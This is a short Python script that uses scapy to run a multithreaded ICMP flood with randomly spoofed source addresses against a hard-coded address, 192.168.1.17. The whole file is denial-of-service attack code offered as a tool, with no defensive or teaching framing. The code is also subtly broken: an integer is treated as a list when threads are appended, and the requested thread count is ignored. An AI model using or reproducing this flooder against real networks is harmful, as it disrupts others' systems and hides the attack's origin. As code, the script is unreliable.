
import threading
from scapy.all import *
#tarIP = input("Target IP:")
countThread = int(input("Enter Threads:"))

def icmpFlood(dest):
    for x in range(100):
        IP_Packet = IP()
        IP_Packet.src = str(RandIP())
        IP_Packet.dst = dest
        send(IP_Packet/ICMP(),verbose=False)
        print("-"*35 + "ICMP FLOOD"+35*"-"+"\n")
threads =countThread
for _ in range(10):
    t = threading.Thread(target=icmpFlood,args=("192.168.1.17",))
    t.start()
    threads.append(t)
for thread in threads:
    thread.join()
